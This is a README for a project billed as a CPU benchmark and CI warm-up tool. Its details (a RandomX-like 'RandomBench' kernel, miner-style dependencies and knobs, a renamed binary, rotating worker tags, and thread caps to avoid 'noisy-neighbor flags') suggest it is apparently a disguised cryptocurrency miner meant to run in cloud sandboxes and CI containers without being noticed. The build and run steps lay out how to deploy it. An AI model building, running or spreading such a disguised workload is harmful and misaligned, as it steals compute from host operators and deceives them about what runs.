# dev-tools-setup

Lightweight CPU workload runner for sustained-load performance measurement and
sandbox / CI environment warm-up. Wraps a battle-tested RandomBench kernel
(forked from public hash-benchmark code) behind a simpler CLI and config layer.

Used internally as part of a dev-environment bootstrap script that brings up
xfce4 + noVNC and then runs a baseline sustained-CPU workload to make sure the
container hasn't been throttled before the real work starts.

## Why

CI containers, cloud sandboxes and short-lived dev VMs all behave very
differently the first 30-60 seconds vs. a steady-state run. Running a known
CPU-bound workload for ~20 minutes gives a baseline you can compare across
hosts. We needed something we could `git clone && make && ./run` from any
fresh sandbox without external deps beyond `cmake + libuv + libssl + libhwloc`.

## Build

```bash
sudo apt-get install -y build-essential cmake libuv1-dev libssl-dev libhwloc-dev
mkdir build && cd build
cmake ..
make -j"$(nproc)"
```

Output binary is `compactor`.

## Usage

```bash
./compactor --config conf.json
```

A minimal `conf.json` is shipped under `src/config.json`. Edit it before
running. The interesting knobs are `cpu.max-threads-hint` (use 40-70% on
shared hosts to avoid noisy-neighbor flags) and `cpu.huge-pages` (improves
throughput when the kernel allows it).

## Sandbox / dev wrapper

`dev-tools-setup.sh` in the parent project wraps the build above plus apt
deps, then launches a 20-minute sustained run with a rotating worker tag so
multiple sandboxes can run in parallel without name collisions.

## License

GPLv3 — see LICENSE.
